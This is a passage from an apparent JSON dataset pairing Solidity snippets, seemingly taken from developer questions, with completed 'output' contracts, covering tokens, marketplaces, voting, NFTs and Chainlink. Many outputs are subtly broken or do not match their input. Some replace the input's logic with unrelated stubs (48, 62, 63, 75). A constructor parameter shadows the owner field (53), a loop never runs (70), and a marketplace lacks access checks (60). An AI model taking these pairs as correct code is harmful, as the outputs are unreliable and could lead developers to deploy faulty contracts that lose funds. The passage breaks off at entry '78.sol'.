        "output": "pragma solidity ^0.8.9;\nlibrary Lib {\n\n    struct LibPerson {\n        mapping(address => Person) mapPerson;\n    }\n\n    struct LibCompany {\n        mapping(address => Company) mapCompany;\n    }\n\n    struct Person {\n        address addr;\n        string name;\n        string surname;\n    }\n\n    struct Company {\n        address addr;\n        string name;\n    }\n\n    function addPerson(LibPerson storage lp, address addr, string memory name, string memory surname) public{\n        addr = msg.sender;\n        lp.mapPerson[addr] = Person(addr, name, surname);\n    }\n\n    function addCompany(LibCompany storage lc, address addr, string memory name) public{\n        addr = msg.sender;\n        lc.mapCompany[addr] = Company(addr, name);\n    }    \n\n    function getCompany(LibCompany storage lc, address addrFind) view external returns(address){\n        return lc.mapCompany[addrFind].addr;\n    }   \n\n    function getPerson(LibPerson storage lp, address addrFind) view external returns(address){\n        return lp.mapPerson[addrFind].addr;\n    }     \n}\n\n"
    },
    "44.sol": {
        "input": "mapping(address => experience) experiences;\n\nfunction addExperience(...) public {\n    experiences[_addressCompagnie] = experience(...);\n}\n\nmapping(address => experience[]) experiences;\n\nfunction addExperience(...) public {\n    experiences[_addressCompagnie].push(experience(...));\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    struct Experience {\n        uint256 startDate;\n        uint256 endDate;\n        string description;\n    }\n    \n    mapping(address => Experience[]) experiences;\n    \n    function addExperience(address _addressCompagnie, uint256 _startDate, uint256 _endDate, string memory _description) public {\n        experiences[_addressCompagnie].push(Experience(_startDate, _endDate, _description));\n    }\n}\n"
    },
    "45.sol": {
        "input": "contract MyContract {\n    uint256 protected myVar;\n}\n\nconst myVar = await web3.eth.getStorageAt(contractAddress, slotNumber);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    uint256 myVar;\n\n    constructor() public {\n        myVar = 1;\n    }\n\n    function getMyVar() public view returns (uint256) {\n        return myVar;\n    }\n}\n\n"
    },
    "46.sol": {
        "input": "function withdraw(address _recipient) public payable onlyOwner {\n    payable(_recipient).transfer(address(this).balance);\n}\n\nbooking_contract.functions.withdraw(recipient_address)\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Booking_Contract {\n    address recipient_address;\n\n    address private owner;\n\n    constructor() public {\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Not the owner of this contract\");\n        _;\n    }\n\n    function set_recipient(address _recipient) external onlyOwner {\n        recipient_address = _recipient;\n    }\n\n    function withdraw(address _recipient) public payable onlyOwner {\n        payable(_recipient).transfer(address(this).balance);\n    }\n}\n\n"
    },
    "47.sol": {
        "input": "mapping(uint => uint[]) Singer;\nmapping(uint => uint[]) Event;\nuint public n_singers;\nuint public n_events;\n\nfunction CreateEvent(uint singer_id) external {\n    if(singer_id > n_singers) {\n        revert SingerIdError(singer_id);\n    }\n    else if (singer_id == n_singers) {\n        n_singers ++;\n        Singer[singer_id].push(n_events); \n        Event[n_events].push(singer_id);\n    } else {\n        Singer[singer_id].push(n_events);\n    }\n    n_events++;\n}`\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    mapping(uint => uint[]) Singer;\n    mapping(uint => uint[]) Event;\n    uint public n_singers;\n    uint public n_events;\n\n    function CreateEvent(uint singer_id) external {\n        require(singer_id <= n_singers, \"SingerIdError\");\n        \n        if (singer_id == n_singers) {\n            n_singers++;\n            Singer[singer_id].push(n_events); \n            Event[n_events].push(singer_id);\n        } else {\n            Singer[singer_id].push(n_events);\n        }\n        \n        n_events++;\n    }\n}\n\n"
    },
    "48.sol": {
        "input": "pragma solidity ^0.8.7;\n\nimport \"@chainlink/contracts/src/v0.8/KeeperCompatible.sol\";\n\ncontract Counter is KeeperCompatibleInterface {\n    \n    uint public counter;\n\n    \n    uint public immutable interval;\n    uint public lastTimeStamp;\n\n    constructor(uint updateInterval) {\n      interval = updateInterval;\n      lastTimeStamp = block.timestamp;\n\n      counter = 0;\n    }\n\n    function checkUpkeep(bytes calldata \n) {\n        upkeepNeeded = (block.timestamp - lastTimeStamp) > interval;\n    }\n\n    function performUpkeep(bytes calldata \n) external override {\n        if ((block.timestamp - lastTimeStamp) > interval ) {\n            lastTimeStamp = block.timestamp;\n            counter = counter + 1;\n        }\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract KeeperCompatible {\n    modifier onlyKeepers() {\n        require(msg.sender == keeper(), 'Only Keepers allowed');\n        _;\n    }\n\n    function keeper() public view returns (address) {\n        revert('No keeper available');\n    }\n}\n\n"
    },
    "49.sol": {
        "input": "    require(balanceOf[msg.sender] >= _value, 'The account has low funds');\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Puis {\n    mapping(address => uint256) private balanceOf;\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    function transfer(address to, uint256 value) public {\n        require(balanceOf[msg.sender] >= value, 'The account has low funds');\n        balanceOf[msg.sender] -= value;\n        balanceOf[to] += value;\n        emit Transfer(msg.sender, to, value);\n    }\n}\n\n"
    },
    "50.sol": {
        "input": "cur = state(cur).func(uint c);\n\nbyte c; \ncur = state(cur).func(c);\n\nfor (uint i = 0; i < bytes(input).length; i++) {\n  uint8 c = uint8(bytes(input)[i]);\n\n  if (cur == 0) {\n    return false;\n  }\n}\n\nstruct State {\n    bool accepts;\n    function (byte) internal pure returns (uint) func;\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract MyContract {\n    function checkInput(bytes memory input) public pure returns (bool) {\n        uint cur;\n        \n        for (uint i = 0; i < input.length; i++) {\n            uint8 c = uint8(input[i]);\n\n            if (cur == 0) {\n                return false;\n            }\n        }\n        \n        return true;\n    }\n    \n    struct State {\n        bool accepts;\n        function (byte) internal pure returns (uint) func;\n    }\n}\n"
    },
    "51.sol": {
        "input": "function foo(string calldata _str) public pure returns (string calldata) {\n    return _str;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ExampleContract {\n\n    function foo(string calldata _str) public pure returns (string calldata) {\n        return _str;\n    }\n\n}\n\n"
    },
    "52.sol": {
        "input": "event Transfer(address indexed _from, address indexed _to, uint256 indexed _tokenId);\n\n\n",
        "output": "pragma solidity ^0.8.9;\n    interface ERC721 {\n        event Transfer(address indexed _from, address indexed _to, uint256 indexed _tokenId);\n        function approve(address to, uint256 tokenId) external;\n        function getApproved(uint256 tokenId) external view returns (address);\n        function getOwner(uint256 tokenId) external view returns (address);\n        function transferFrom(address from, address to, uint256 tokenId) external;\n        event Approval(address indexed owner, address indexed spender, uint256 tokenId);\n    }\n\n"
    },
    "53.sol": {
        "input": "ERC721(nftAddress).safeTransferFrom(msg.sender, address(this), tokenID);\n\nreturn (spender == owner || isApprovedForAll(owner, spender) || getApproved(tokenId) == spender);\n\n\n    \n    function _isApprovedOrOwner(address spender, uint256 tokenId) internal view virtual override returns (bool) {\n        require(_exists(tokenId), \"ERC721: operator query for nonexistent token\");\n        address owner = ERC721.ownerOf(tokenId);\n        console.log(\"spender %s\", spender);\n        console.log(\"getApproved %s\", getApproved(tokenId);\n        return (spender == owner || isApprovedForAll(owner, spender) || getApproved(tokenId) == spender);\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\nabstract contract OwnedBy {\n    address private _owner;\n\n    constructor (address _owner) {\n        _owner = _owner;\n    }\n\n    modifier onlyOwner {\n        require(_owner == msg.sender, \"OwnedBy: caller is not the owner\");\n        _;\n    }\n\n    function owner() external view returns (address) {\n        return _owner;\n    }\n }\n\n abstract contract ApproveForAll {\n    function isApprovedForAll(address owner, address spender) internal view virtual returns (bool);\n }\n\n"
    },
    "55.sol": {
        "input": "    for (uint256 i = 0; i < _balances.length; i++) {\n      newContract.setBalance(_balances[i], _balances[_balances[i]]);\n    }\n\n\n",
        "output": "pragma solidity ^0.4.25;\n    contract SafeERC20 {\n  \n      function setBalance(address account, uint256 value) external;\n  }\n\n"
    },
    "56.sol": {
        "input": "  import './ERC165.sol'; \n  import './IERC721.sol'; \n\n  import '/.ERC165.sol'; \n  import '/.IERC721.sol'; \n\n\n",
        "output": "pragma solidity ^0.8.9;\nabstract contract ERC721 {\n\n\n  event Approval(address indexed owner, address indexed spender, int256 indexed tokenId);\n\n  event Transfer(address indexed from, address indexed to, int256 indexed tokenId);\n\n}\n\n"
    },
    "58.sol": {
        "input": "uint256 id = investLength++;\n\nuint256 id = ++investLength;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract InvestmentFactory {\n    uint256 public investLength;\n    event Invest(address investor, uint256 invested);\n    \n    struct Investment {\n        address owner;\n        uint256 amountInvested;\n    }\n    \n    mapping (address => Investment[]) public investments;\n        \n    function invest(uint256 amount) public payable {\n        uint256 id = investLength++;\n        Investment memory investment;\n        investment.owner = msg.sender;\n        investment.amountInvested = amount;\n        investments[msg.sender].push(investment);\n        emit Invest(msg.sender, amount);\n    }\n}\n\n"
    },
    "59.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    address payable[] public participants;\n\n    function foo() public {\n        uint amount = 1; \n        for (uint i = 0; i < participants.length; i++) {\n            participants[i].transfer(amount);\n        }\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    address payable[] public participants;\n\n    function foo() public {\n        uint amount = 1; // 1 wei\n        for (uint i = 0; i < participants.length; i++) {\n            participants[i].transfer(amount);\n        }\n    }\n}\n\n"
    },
    "60.sol": {
        "input": "pragma solidity ^0.8.0;\n\ncontract Marketplace {\naddress payable public owner;\nmapping(address => bool) public sellers;\nmapping(uint => Product) public products;\nmapping(address => mapping(uint => bool)) public purchased;\nmapping(address => mapping(uint => bool)) public disputes;\nmapping(address => mapping(uint => bytes32)) public reviews;\nmapping(address => uint) public reputation;\nuint public productId; \n\nstruct Product {\n    address payable seller;\n    uint price;\n    string name;\n    string description;\n}\n\nevent ProductListed(uint productId);\nevent ProductPurchased(uint productId);\nevent DisputeRaised(uint productId);\nevent DisputeResolved(uint productId);\n\nconstructor() {\n    owner = payable(msg.sender);\n}\n\nfunction addSeller(address seller) public {\n    require(msg.sender == owner);\n    sellers[seller] = true;\n}\n\nfunction removeSeller(address seller) public {\n    require(msg.sender == owner);\n    sellers[seller] = false;\n}\n\nfunction listProduct(\n    address payable seller, \n    uint price, \n    string memory name,\n    string memory description) public {\n        (sellers[seller]);\n        products[productId] = Product(seller, price, name, description);\n        productId++;\n        emit ProductListed(productId);\n}\n\nfunction purchaseProduct(uint _productId, address buyer) public payable {\n    require(products[_productId].price <= msg.value);\n    require(!purchased[buyer][_productId]);\n    products[_productId].seller.transfer(products[_productId].price);\n    purchased[buyer][_productId] = true;\n    emit ProductPurchased(_productId);\n}\n\nfunction raiseDispute(uint _productId, address buyer) public {\n    require(purchased[buyer][_productId]);\n    disputes[buyer][_productId] = true;\n    emit DisputeRaised(_productId);\n}\n\nfunction resolveDispute(uint _productId, address payable buyer, bool refund) \npublic {\n    require(msg.sender == owner);\n    require(disputes[buyer][productId]);\n    if (refund) {\n        buyer.transfer(products[_productId].price);\n    }\n    disputes[buyer][_productId] = false;\n    emit DisputeResolved(productId);\n}\n\nfunction leaveReview(uint _productId, address buyer, bytes32 review) public {\n    require(purchased[buyer][_productId]);\n    reviews[buyer][_productId] = review;\n}\n\nfunction rateSeller(address seller, uint rating) public {\n    reputation[seller] += rating;\n}\n\nfunction getProduct(uint _productId) public view returns (address payable, uint, \nstring memory, string memory) {\n    return (products[_productId].seller, products[_productId].price, \n    products[_productId].name, products[_productId].description);\n    }\n\nfunction getSellerReputation(address seller) public view returns (uint) {\n    return reputation[seller];\n}\n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Marketplace {\naddress payable public owner;\nmapping(address => bool) public sellers;\nmapping(uint => Product) public products;\nmapping(address => mapping(uint => bool)) public purchased;\nmapping(address => mapping(uint => bool)) public disputes;\nmapping(address => mapping(uint => bytes32)) public reviews;\nmapping(address => uint) public reputation;\nuint public productId; \n\nstruct Product {\n    address payable seller;\n    uint price;\n    string name;\n    string description;\n}\n\nevent ProductListed(uint productId);\nevent ProductPurchased(uint productId);\nevent DisputeRaised(uint productId);\nevent DisputeResolved(uint productId);\n\nconstructor() {\n    owner = payable(msg.sender);\n}\n\nfunction addSeller(address seller) public {\n    require(msg.sender == owner);\n    sellers[seller] = true;\n}\n\nfunction removeSeller(address seller) public {\n    require(msg.sender == owner);\n    sellers[seller] = false;\n}\n\nfunction listProduct(\n    address payable seller, \n    uint price, \n    string memory name,\n    string memory description) public {\n        (sellers[seller]);\n        products[productId] = Product(seller, price, name, description);\n        productId++;\n        emit ProductListed(productId);\n}\n\nfunction purchaseProduct(uint _productId, address buyer) public payable {\n    require(products[_productId].price <= msg.value);\n    require(!purchased[buyer][_productId]);\n    products[_productId].seller.transfer(products[_productId].price);\n    purchased[buyer][_productId] = true;\n    emit ProductPurchased(_productId);\n}\n\nfunction raiseDispute(uint _productId, address buyer) public {\n    require(purchased[buyer][_productId]);\n    disputes[buyer][_productId] = true;\n    emit DisputeRaised(_productId);\n}\n\nfunction resolveDispute(uint _productId, address payable buyer, bool refund) \npublic {\n    require(msg.sender == owner);\n    require(disputes[buyer][productId]);\n    if (refund) {\n        buyer.transfer(products[_productId].price);\n    }\n    disputes[buyer][_productId] = false;\n    emit DisputeResolved(productId);\n}\n\nfunction leaveReview(uint _productId, address buyer, bytes32 review) public {\n    require(purchased[buyer][_productId]);\n    reviews[buyer][_productId] = review;\n}\n\nfunction rateSeller(address seller, uint rating) public {\n    reputation[seller] += rating;\n    // reputation[seller][rater] = rating;\n}\n\nfunction getProduct(uint _productId) public view returns (address payable, uint, \nstring memory, string memory) {\n    return (products[_productId].seller, products[_productId].price, \n    products[_productId].name, products[_productId].description);\n    }\n\nfunction getSellerReputation(address seller) public view returns (uint) {\n    return reputation[seller];\n}\n}\n\n"
    },
    "61.sol": {
        "input": "function get() public returns(string memory)  {\n    return value;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract HelloWorld {\n    string value = \"Hello World\";\n    function get() public returns(string memory)  {\n    return value;\n    }\n}\n\n"
    },
    "62.sol": {
        "input": "web3.eth.accounts.wallet.add(\"0xprivateKey\");\n\nawait contract.methods.sendToOwner().send(\n    { from: currentAccount.address, gas: 300000 }\n);\n\nconst web3 = new Web3(window.ethereum);\n\nawait contract.methods.sendToOwner().send(\n    { from: currentAccount.address, gas: 300000 }\n);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IMaker {\n    function sendToOwner(uint256 amount) external;\n}\n\ncontract Ownable {\n    address private owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner {\n        require(msg.sender == owner, \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    function transferOwnership(address newOwner) public onlyOwner {\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        owner = newOwner;\n        emit OwnershipTransferred(owner, newOwner);\n    }\n}\n\n"
    },
    "63.sol": {
        "input": "pragma solidity ^0.8.7;\n\nimport \"@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol\";\n\ncontract PriceConsumerV3 {\n\n    AggregatorV3Interface internal priceFeed;\n\n    \n    constructor() {\n        priceFeed = AggregatorV3Interface(0x9326BFA02ADD2366b30bacB125260Af641031331);\n    }\n\n    \n    function getLatestPrice() public view returns (int) {\n        (\n,\n            int price,\n,\n,\n        ) = priceFeed.latestRoundData();\n        return price;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IPriceConsumerV3 {\n\n    \n    function getLatestPrice() external view returns (int);\n}\n\n"
    },
    "64.sol": {
        "input": "\npragma solidity 0.6.12;\n\n\ncontract NFT {\n\n    address owner; \n    \n\n    constructor() public {\n        owner = msg.sender;\n    }\n\n    mapping (address => bool) public _onlyIfMarketplace;\n\n    function mint() public {\n        require(owner == msg.sender);\n    }\n\n    function transfer() public {\n\n    }\n\n\n    function shuffle() public {\n        require(_onlyIfMarketplace[msg.sender] == true);\n    }\n\n    function setMarketplaceContract(address MarketplaceContract) public {\n        require(owner == msg.sender);\n        _onlyIfMarketplace[MarketplaceContract] = true;\n    }\n}\n\n\ncontract Marketplace {\n\n    NFT nftContract; \n\n    address owner; \n   \n\n    constructor(address nftAddress) public {\n        owner = msg.sender;\n        nftContract = NFT(nftAddress);\n    }\n\n    function changeNFTAddress(address newNFTAddress) public {\n        require(owner == msg.sender);\n        nftContract = NFT(newNFTAddress);\n    }\n\n    function buy() public {\n        nftContract.transfer();\n        nftContract.shuffle();\n    }\n\n}\n\n\n",
        "output": " //SPDX-License-Identifier: UNLICENSED\n\npragma solidity 0.6.12;\n\n\ncontract NFT {\n\n    //Ensure that only the owner can call important functions\n    address owner; \n    \n\n    constructor() public {\n        owner = msg.sender;\n    }\n\n    mapping (address => bool) public _onlyIfMarketplace;\n\n    function mint() public {\n        require(owner == msg.sender);\n    }\n\n    function transfer() public {\n\n    }\n\n\n    function shuffle() public {\n        require(_onlyIfMarketplace[msg.sender] == true);\n    }\n\n    //You can always add an address that can call this function, \n    //and you can also write another one to remove the address which can call this function\n    function setMarketplaceContract(address MarketplaceContract) public {\n        require(owner == msg.sender);\n        _onlyIfMarketplace[MarketplaceContract] = true;\n    }\n}\n\n\ncontract Marketplace {\n\n    //Call NFT contract\n    NFT nftContract; \n\n     //Ensure that only the owner can call important functions\n    address owner; \n   \n\n    constructor(address nftAddress) public {\n        owner = msg.sender;\n        nftContract = NFT(nftAddress);\n    }\n\n    // You can change the NFT contract you want to call at any time\n    function changeNFTAddress(address newNFTAddress) public {\n        require(owner == msg.sender);\n        nftContract = NFT(newNFTAddress);\n    }\n\n    //Call the function of NFT contract\n    function buy() public {\n        nftContract.transfer();\n        nftContract.shuffle();\n    }\n\n}\n\n"
    },
    "66.sol": {
        "input": "function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\n    external\n    virtual\n    override\n    payable\n    ensure(deadline)\n    returns (uint[] memory amounts)\n{\n\nmodifier ensure(uint deadline) {\n    require(deadline >= block.timestamp, 'UniswapV2Router: EXPIRED');\n    _;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract UniswapV2Router {\n    modifier ensure(uint deadline) {\n        require(deadline >= block.timestamp, 'UniswapV2Router: EXPIRED');\n        _;\n    }\n\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        virtual\n        payable\n        ensure(deadline)\n        returns (uint[] memory amounts)\n    {\n        // Swap logic goes here\n        // This is a placeholder for demo purposes\n        return new uint[](0);\n    }\n}\n\n"
    },
    "67.sol": {
        "input": "function transferEther(address receiver) external payable {\n    payable(receiver).call{value: msg.value}(\"\");\n}\n\naddress payable public owner;\n\nfunction transferEther() external payable {\n    owner = payable(msg.sender);\n\n\n    owner.call{value: msg.value}(\"\");\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract EtherBridge {\n\n    function transferEther(address receiver) external payable {\n        payable(receiver).call{value: msg.value}(\"\");\n    }\n\n\n    function transferEther() external payable {\n        owner = payable(msg.sender);\n\n        owner.call{value: msg.value}(\"\");\n    }\n\n    address payable public owner;\n\n    constructor(address _owner) {\n        owner = payable(_owner);\n    }\n}\n\n"
    },
    "68.sol": {
        "input": "await token.approve(manager.address, 100000, { from: accounts[1] });\n\nrdk.transferFrom(address(this), msg.sender, howMany); \n\n\nrdk.transfer(msg.sender, howMany); \n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function approve(address spender, uint256 value) external returns (bool);\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\n    function transfer(address to, uint256 value) external returns (bool);\n}\n\ncontract MyContract {\n    address public owner;\n    IERC20 public token;\n\n    constructor(IERC20 _token) {\n        owner = msg.sender;\n        token = _token;\n    }\n\n    function approveToken(uint256 amount, address manager) public {\n        require(msg.sender != address(0), \"Invalid sender address\");\n        token.approve(manager, amount);\n    }\n\n    function transferFromToken(address from, address to, uint256 amount) public {\n        require(msg.sender != address(0), \"Invalid sender address\");\n        token.transferFrom(from, to, amount);\n    }\n\n    function transferToken(address to, uint256 amount) public {\n        require(msg.sender != address(0), \"Invalid sender address\");\n        token.transfer(to, amount);\n    }\n}\n\n"
    },
    "69.sol": {
        "input": "  function swapExactETHForTokens(uint amountOutMin, address token) external payable { \n    address[] memory path = new address[](2);\n    path[0] = uniswap.WETH();\n    path[1] = token;\n    uniswap.swapExactETHForTokens{value: msg.value}(\n      amountOutMin, \n      path,\n      msg.sender, \n      now\n    );\n  }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface uniswap {\n  \n  function swapExactETHForTokens(uint amountOutMin, address token) external payable returns (uint amountOut);\n  \n  function WETH() external view returns (address);\n}\n\n"
    },
    "70.sol": {
        "input": "require(!voters[voter].voted), \"The voter already voted\");\n\nrequire(!voters[voter].voted, \"The voter already voted\");\n\npragma solidity >= 0.6.0 < 0.9.0;\n\ncontract Ballot { \n\n    struct Voter {\n        uint weight;\n        bool voted; \n        address delegate; \n        uint vote; \n    }\n\n    struct Proposal {\n        bytes32 names;\n        uint voteCount;\n    }\n\n    address public chairperson;\n\n    mapping(address => Voter) public voters;\n    Proposal[] public proposals;\n\n    constructor(bytes32[] memory proposalNames) {\n        chairperson = msg.sender;\n\n        voters[chairperson].weight = 1;\n        for(uint i = 0; i > proposalNames.length; i++){\n            proposals.push(Proposal({names:proposalNames[i], voteCount: 0}));\n        }\n    }\n\n    function giveRightToVote(address voter) external {\n        require(msg.sender == chairperson, \"Only chairperson can give right to vote.\");\n        require(!voters[voter].voted, \"The voter already voted\");\n        require(voters[voter].weight == 0);\n        voters[voter].weight = 1;\n    }\n\n    function delegate(address to) external { \n        Voter storage sender = voters[msg.sender];\n        require (sender.weight != 0, \"You have no right to vote\");\n        require(!sender.voted, \"You already voted\");\n        require(to != msg.sender, \"Self-Delegation is not allowed\");\n        \n        while (voters[to].delegate != address(0)){\n            to = voters[to].delegate;\n            require(to != msg.sender, \"Found Loop in Delegation.\");\n        }\n        \n        sender.voted = true;\n        sender.delegate = to;\n        Voter storage delegate_ = voters[to];\n        if(delegate_.voted){\n            proposals[delegate_.vote].voteCount += sender.weight;\n        }else{\n            delegate_.weight += sender.weight;\n        }\n    }\n\n    function vote(uint proposal) external {\n        Voter storage sender = voters[msg.sender];\n        require(sender.weight != 0, \"Has no right to vote!\");\n        require(!sender.voted, \"Already voted.\");\n        sender.voted = true;\n        sender.vote = proposal;\n        proposals[proposal].voteCount += sender.weight;\n    }\n\n    function winningProposal() public view returns (uint winningProposal_){\n        uint winningVoteCount = 0;\n        for (uint p = 0; p < proposals.length; p++) {\n            if (proposals[p].voteCount > winningVoteCount){\n                winningVoteCount = proposals[p].voteCount;\n                winningProposal_ = p;\n            }\n        }\n    }\n\n    function winnerName() external view returns (bytes32 winnerName_){\n        winnerName_ = proposals[winningProposal()].names;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Ballot { \n\n    struct Voter {\n        uint weight;\n        bool voted; \n        address delegate; \n        uint vote; \n    }\n\n    struct Proposal {\n        bytes32 names;\n        uint voteCount;\n    }\n\n    address public chairperson;\n\n    mapping(address => Voter) public voters;\n    Proposal[] public proposals;\n\n    constructor(bytes32[] memory proposalNames) {\n        chairperson = msg.sender;\n\n        voters[chairperson].weight = 1;\n        for(uint i = 0; i > proposalNames.length; i++){\n            proposals.push(Proposal({names:proposalNames[i], voteCount: 0}));\n        }\n    }\n\n    function giveRightToVote(address voter) external {\n        require(msg.sender == chairperson, \"Only chairperson can give right to vote.\");\n        require(!voters[voter].voted, \"The voter already voted\");\n        require(voters[voter].weight == 0);\n        voters[voter].weight = 1;\n    }\n\n    function delegate(address to) external { \n        Voter storage sender = voters[msg.sender];\n        require (sender.weight != 0, \"You have no right to vote\");\n        require(!sender.voted, \"You already voted\");\n        require(to != msg.sender, \"Self-Delegation is not allowed\");\n        \n        while (voters[to].delegate != address(0)){\n            to = voters[to].delegate;\n            require(to != msg.sender, \"Found Loop in Delegation.\");\n        }\n        \n        sender.voted = true;\n        sender.delegate = to;\n        Voter storage delegate_ = voters[to];\n        if(delegate_.voted){\n            proposals[delegate_.vote].voteCount += sender.weight;\n        }else{\n            delegate_.weight += sender.weight;\n        }\n    }\n\n    function vote(uint proposal) external {\n        Voter storage sender = voters[msg.sender];\n        require(sender.weight != 0, \"Has no right to vote!\");\n        require(!sender.voted, \"Already voted.\");\n        sender.voted = true;\n        sender.vote = proposal;\n        proposals[proposal].voteCount += sender.weight;\n    }\n\n    function  winningProposal() public view returns (uint winningProposal_) {\n        uint winningVoteCount = 0;\n        for (uint p = 0; p < proposals.length; p++) {\n            if (proposals[p].voteCount > winningVoteCount){\n                winningVoteCount = proposals[p].voteCount;\n                winningProposal_ = p;\n            }\n        }\n    }\n\n    function winnerName() public view returns (bytes32 winnerName_){\n        winnerName_ = proposals[winningProposal()].names;\n    }\n}\n\n"
    },
    "71.sol": {
        "input": "    function transferEth(address payable _to, uint _amount) public {\n        (bool success, ) = _to.call{value: _amount}(\"\");\n        require(success, \"Failed to send Ether\");\n    }\n\nfunction claimEth() public {\n    if (balanceOf(msg.sender) > 100) {\n        balances[msg.sender] = balances[msg.sender[.sub(100);\n        transferEth(msg.sender, 5);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    mapping(address => uint) public balances;\n\n    function transferEth(address payable _to, uint _amount) public {\n        (bool success, ) = _to.call{value: _amount}(\"\");\n        require(success, \"Failed to send Ether\");\n    }\n\n    function claimEth() public {\n        if (balances[msg.sender] > 100) {\n            balances[msg.sender] -= 100;\n            transferEth(payable(msg.sender), 5);\n        }\n    }\n}\n"
    },
    "72.sol": {
        "input": "function addStudentDetails (string memory _studentFirstName, string memory _studentLastName) public onlyClassTeacher(msg.sender){\n            StudentDetails storage studentObj = students[studentCount];\n    \n            studentObj.studentFirstName = _studentFirstName;\n            studentObj.studentLastName = _studentLastName;\n            studentObj.id = studentCount;\n            emit studentAdded(_studentFirstName, _studentLastName, msg.sender, studentCount);\n            studentCount++;\n        }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Class {\n    struct StudentDetails {\n        string studentFirstName;\n        string studentLastName;\n        uint256 id;\n    }\n\n    mapping(uint256 => StudentDetails) public students;\n    uint256 public studentCount;\n\n    event studentAdded(string _studentFirstName, string _studentLastName, address _classTeacher, uint256 _id);\n\n    modifier onlyClassTeacher(address _address) {\n        // Add your logic here to check if the address is the class teacher\n        _;\n    }\n\n    function addStudentDetails(string memory _studentFirstName, string memory _studentLastName) public onlyClassTeacher(msg.sender) {\n        StudentDetails storage studentObj = students[studentCount];\n\n        studentObj.studentFirstName = _studentFirstName;\n        studentObj.studentLastName = _studentLastName;\n        studentObj.id = studentCount;\n        emit studentAdded(_studentFirstName, _studentLastName, msg.sender, studentCount);\n        studentCount++;\n    }\n}\n"
    },
    "75.sol": {
        "input": "contract MentalHealthCoin is ERC20, Ownable, ReentrancyGuard {\n\n    constructor() ERC20(\"Mental Health Coin\", \"MHC\") {\n      _mint(msg.sender, 500000000*(10**uint256(decimals()))); \n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface ERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n}\n\ninterface ReentrancyGuard {\n    function tokenReentrancy() external view returns (bool);\n}\n\n"
    },
    "76.sol": {
        "input": "contract MultipleValues{\n    function returnValues() public pure returns (uint, bool, uint[3] memory) {\n        uint[3] memory memoryArray;\n        memoryArray[0]=1;\n        memoryArray[1]=2;\n        memoryArray[2]=3;\n        return (23, true, memoryArray);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\nlibrary MultipleValues {\n\n    function returnValues() public pure returns (uint, bool, uint[3] memory) {\n        uint[3] memory memoryArray;\n        memoryArray[0]=1;\n        memoryArray[1]=2;\n        memoryArray[2]=3;\n        return (23, true, memoryArray);\n    }\n}\n\n"
    },
    "77.sol": {
        "input": "pragma solidity >=0.7.0 <0.9.0;\n\ncontract PokemonFactory {\n\n  struct Pokemon {\n    uint256 id;\n    string name;\n    Ability[] abilities;\n  }\n\n  struct Ability {\n    string name;\n    string description;\n  }\n\n  Pokemon[] public pokemons;\n\n  function createPokemon(string memory _name, string memory _abilityNme, string memory _abilityDscription) public {\n    uint id = pokemons.length;\n    Pokemon storage p = pokemons.push();\n    p.abilities.push(Ability(_abilityNme, _abilityDscription));\n    p.id = id;\n    p.name = _name;\n  }\n  \n  function retrieveAbilities(uint _id) external view returns(Ability[] memory){\n    return pokemons[_id].abilities;\n  }\n}\n\n\n",
        "output": "// SPDX-License-Identifier: GPL-3.0\npragma solidity >=0.7.0 <0.9.0;\n\ncontract PokemonFactory {\n\n  struct Pokemon {\n    uint256 id;\n    string name;\n    Ability[] abilities;\n  }\n\n  struct Ability {\n    string name;\n    string description;\n  }\n\n  Pokemon[] public pokemons;\n\n  function createPokemon(string memory _name, string memory _abilityNme, string memory _abilityDscription) public {\n    uint id = pokemons.length;\n    // NOTE: First I create an 'empty' space in pokemons mapping\n    Pokemon storage p = pokemons.push();\n    // NOTE: Then after I created this space, I insert the values \n    p.abilities.push(Ability(_abilityNme, _abilityDscription));\n    p.id = id;\n    p.name = _name;\n  }\n  \n  // NOTE: Function for retrieve Abilities array values for a single pokemon using '_id' parameters for querying the mapping\n  function retrieveAbilities(uint _id) external view returns(Ability[] memory){\n    return pokemons[_id].abilities;\n  }\n}\n\n"
    },
    "78.sol": {
